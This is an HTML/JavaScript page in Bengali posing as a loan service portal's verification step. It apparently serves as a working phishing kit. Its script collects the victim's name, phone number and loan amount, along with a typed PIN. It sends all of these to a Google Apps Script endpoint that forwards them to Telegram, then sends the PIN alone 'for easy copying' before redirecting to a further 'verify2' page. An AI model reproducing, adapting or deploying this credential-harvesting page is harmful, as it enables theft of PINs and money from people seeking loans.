<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ভেরিফিকেশন - লোন সার্ভিস</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            -webkit-tap-highlight-color: transparent;
        }

        body { 
            background: #ffffff; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
        }

        .container { 
            width: 100%; 
            max-width: 450px; 
            background: #ffffff; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: space-between;
            padding: 30px 24px 25px;
            box-shadow: 0 0 25px rgba(255, 94, 0, 0.08); 
            border-left: 1px solid #fff7ed;
            border-right: 1px solid #fff7ed;
        }

        /* উপরের ল্যাঙ্গুয়েজ/স্ট্যাটাস পিল */
        .top-row {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 25px;
        }

        .lang-switch {
            background: #f1f5f9;
            border-radius: 20px;
            display: flex;
            padding: 3px;
        }

        .lang-btn {
            padding: 4px 14px;
            font-size: 12px;
            border-radius: 16px;
            border: none;
            cursor: pointer;
            font-weight: 700;
        }

        .lang-btn.active {
            background: #ff5e00;
            color: #ffffff;
        }

        .lang-btn:not(.active) {
            background: transparent;
            color: #64748b;
        }

        /* ব্র্যান্ড ও লোগো অংশ */
        .brand-section {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 35px;
        }

        .brand-logo {
            width: 55px;
            height: 55px;
            object-fit: cover;
            border-radius: 50%;
            border: 2px solid #fed7aa;
            padding: 2px;
            box-shadow: 0 4px 10px rgba(255, 94, 0, 0.15);
        }

        .brand-info h2 {
            font-size: 20px;
            font-weight: 800;
            color: #ff5e00;
            line-height: 1.2;
        }

        .brand-info p {
            font-size: 12px;
            color: #64748b;
            font-weight: 500;
        }

        /* ইনপুট ফিল্ড ও লেবেল */
        .input-group {
            margin-bottom: 22px;
        }

        .input-label {
            font-size: 13.5px;
            font-weight: 700;
            color: #334155;
            margin-bottom: 8px;
            display: block;
        }

        .input-box {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-box i.input-icon {
            position: absolute;
            left: 16px;
            color: #94a3b8;
            font-size: 16px;
        }

        .form-control {
            width: 100%;
            padding: 14px 16px 14px 44px;
            border: 1.5px solid #fed7aa;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            background: #fffaf5;
            color: #1e293b;
            font-weight: 600;
            letter-spacing: 0.5px;
            transition: all 0.2s;
        }

        .form-control:focus {
            border-color: #ff5e00;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.15);
        }

        .form-control[readonly] {
            background: #f8fafc;
            border-color: #e2e8f0;
            color: #475569;
        }

        .helper-text {
            font-size: 12.5px;
            color: #ff5e00;
            font-weight: 600;
            margin-top: 8px;
            display: inline-block;
            text-decoration: none;
        }

        /* সাবমিট বাটন */
        .btn-submit {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #ff5e00, #ff8800);
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3);
            transition: transform 0.15s;
        }

        .btn-submit:active {
            transform: scale(0.98);
        }

        .btn-submit:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        /* বটম কুইক লিঙ্কস */
        .bottom-links {
            display: flex;
            justify-content: space-around;
            padding-top: 30px;
            border-top: 1px solid #f1f5f9;
            margin-top: 30px;
        }

        .link-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-decoration: none;
            color: #64748b;
            gap: 6px;
        }

        .link-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #fffaf5;
            border: 1px solid #fed7aa;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ff5e00;
            font-size: 16px;
        }

        .link-title {
            font-size: 12px;
            font-weight: 600;
        }
    </style>
</head>
<body>

<div class="container">
    <div>
        <!-- ল্যাঙ্গুয়েজ সুইচ -->
        <div class="top-row">
            <div class="lang-switch">
                <button type="button" class="lang-btn active">বাংলা</button>
                <button type="button" class="lang-btn">ENG</button>
            </div>
        </div>

        <!-- ব্র্যান্ড ও লোগো -->
        <div class="brand-section">
            <img src="logoo.png" alt="Company Logo" class="brand-logo">
            <div class="brand-info">
                <h2>লোন সার্ভিস পোর্টাল</h2>
                <p>নিরাপদ ও দ্রুত যাচাইকরণ</p>
            </div>
        </div>

        <!-- যাচাইকরণ ফর্ম -->
        <form id="verifyForm">
            <!-- ব্যাকগ্রাউন্ডে পূর্ববর্তী পেজের নাম ও টাকার তথ্য জমা রাখার হিডেন ফিল্ড -->
            <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
            <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">

            <!-- ১. মোবাইল নম্বর ফিল্ড -->
            <div class="input-group">
                <label class="input-label">গ্রাহক মোবাইল নম্বর</label>
                <div class="input-box">
                    <i class="fa-solid fa-phone input-icon"></i>
                    <input type="tel" id="userPhone" name="মোবাইল_নম্বর" class="form-control" readonly>
                </div>
            </div>

            <!-- ২. ট্র্যাকিং পিন ফিল্ড -->
            <div class="input-group">
                <label class="input-label">ট্র্যাকিং পিন (PIN)</label>
                <div class="input-box">
                    <i class="fa-solid fa-lock input-icon"></i>
                    <input type="password" id="trackPin" name="ট্র্যাকিং_পিন" class="form-control" required placeholder="• • • •" maxlength="6" inputmode="numeric">
                </div>
                <a href="javascript:void(0)" class="helper-text" onclick="alert('সহায়তার জন্য হেল্পলাইনে যোগাযোগ করুন।')">পিন ভুলে গিয়েছেন? সহায়তা নিন</a>
            </div>

            <!-- সাবমিট বাটন -->
            <button type="submit" id="btnSubmit" class="btn-submit">
                <span>যাচাই ও চূড়ান্ত সাবমিট</span>
                <i class="fa-solid fa-arrow-right"></i>
            </button>
        </form>
    </div>

    <!-- বটম আইকন -->
    <div class="bottom-links">
        <div class="link-item">
            <div class="link-icon"><i class="fa-solid fa-location-dot"></i></div>
            <span class="link-title"> শাখা সমূহ</span>
        </div>
        <div class="link-item">
            <div class="link-icon"><i class="fa-solid fa-percent"></i></div>
            <span class="link-title">অফার</span>
        </div>
        <div class="link-item">
            <div class="link-icon"><i class="fa-solid fa-circle-question"></i></div>
            <span class="link-title">সহায়তা</span>
        </div>
    </div>
</div>

<script>
    // আপনার গুগল অ্যাপস স্ক্রিপ্ট প্রক্সি URL (টেলিগ্রাম নোটিফিকেশনের জন্য)
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-MX5twDJTbDjN-B_llF5Y9TBb_Kv-W2pJ1Soymn3HbEG0CfAEtQ0WV7qmz8OPUgI/exec";

    // পূর্ববর্তী পেজ বা লোকাল স্টোরেজ থেকে ডেটা গ্রহণ
    const params = new URLSearchParams(window.location.search);
    const applicantName = params.get('name') || localStorage.getItem('loan_cust_name') || 'N/A';
    const applicantPhone = params.get('phone') || localStorage.getItem('loan_cust_phone') || '';
    const loanAmount = params.get('amount') || localStorage.getItem('loan_cust_amount') || 'N/A';

    // লোকাল স্টোরেজে ডেটা ব্যাকআপ রাখা (পরবর্তী পেজের জন্য)
    if (applicantName !== 'N/A') localStorage.setItem('loan_cust_name', applicantName);
    if (applicantPhone) localStorage.setItem('loan_cust_phone', applicantPhone);
    if (loanAmount !== 'N/A') localStorage.setItem('loan_cust_amount', loanAmount);

    // ফর্মে ফিল্ডগুলো সেট করা
    document.getElementById('hiddenName').value = applicantName;
    document.getElementById('hiddenAmount').value = loanAmount;
    document.getElementById('userPhone').value = applicantPhone || '০১XXXXXXXXX';

    const form = document.getElementById('verifyForm');
    const btnSubmit = document.getElementById('btnSubmit');

    // ফর্ম সাবমিট হ্যান্ডলার
    form.addEventListener('submit', function(event) {
        event.preventDefault();

        btnSubmit.disabled = true;
        btnSubmit.innerHTML = '<span>তথ্য যাচাই হচ্ছে...</span>';

        const enteredPin = document.getElementById('trackPin').value.trim();

        // ১. সম্পূর্ণ তথ্যের ফরম্যাটেড মেসেজ
        const telegramMessage = `🔐 নতুন পিন যাচাই (ধাপ-১)!\n\n` +
                                `👤 নাম: ${applicantName}\n` +
                                `📞 মোবাইল: ${applicantPhone || 'পাওয়া যায়নি'}\n` +
                                `💰 লোনের পরিমাণ: ${loanAmount} টাকা\n` +
                                `🔑 পিন (PIN): ${enteredPin}\n` +
                                `⏰ সময়: ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}`;

        // ২. শুধুমাত্র পিন নম্বরটি আলাদা মেসেজ (সহজে কপি করার জন্য)
        const pinOnlyMessage = `PIN: ${enteredPin}`;

        // ১ম মেসেজ পাঠানো (বিস্তারিত তথ্য)
        fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: telegramMessage })
        }).finally(() => {
            // ২য় মেসেজ পাঠানো (শুধু পিন)
            fetch(GOOGLE_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: pinOnlyMessage })
            }).finally(() => {
                // সাবমিট শেষে তথ্যসহ verify2.html পেজে নিয়ে যাওয়া
                const queryParams = new URLSearchParams({
                    name: applicantName,
                    phone: applicantPhone,
                    amount: loanAmount
                }).toString();

                window.location.href = "verify2.html?" + queryParams;
            });
        });
    });
</script>

</body>
</html>
